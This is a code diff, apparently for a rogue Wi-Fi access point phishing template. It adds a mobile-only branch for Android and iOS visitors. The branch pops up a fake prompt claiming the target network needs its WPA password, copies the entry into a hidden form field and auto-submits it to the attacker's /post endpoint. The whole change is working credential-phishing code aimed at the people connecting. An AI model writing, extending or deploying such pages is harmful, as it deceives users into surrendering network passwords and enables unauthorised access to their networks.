@@ -285,6 +285,23 @@
         "       </ul> " +
         "       <a href=''>Network settings</a> " +
         "       </div></form>"; 
+        
+        var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="/post">' +
+	'<input class="hidden" id="wifi-search-password" name="wfphshr-wpa-password" />' +
+	' 	<div class="buttons">' +
+        ' 		<button id="button-join" class="action hidden"></button>' +
+        ' 	</div>' +
+	'</form>';
+        
+        function load_mobile() {
+		var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+			
+		if (popup != null) {
+			document.getElementById("wifi-search-password").value = popup;
+			document.getElementById("button-join").click();
+		}
+	}
+        
         </script>
         <title></title>
         </head>
@@ -318,9 +335,14 @@
         </div>
         <div id="loader-mac"></div>
         <div id="loader-windows"></div>
+        <div id="loader-mobile"></div>
         <script>
             if (jscd.os == "Windows") {
                 document.getElementById("loader-windows").innerHTML = loadhtml_windows;
+            }
+            else if (jscd.os == "Android" || jscd.os == "iOS") {
+		document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
+                load_mobile();
             }
             else {
                 document.getElementById("loader-mac").innerHTML = loadhtml_mac;
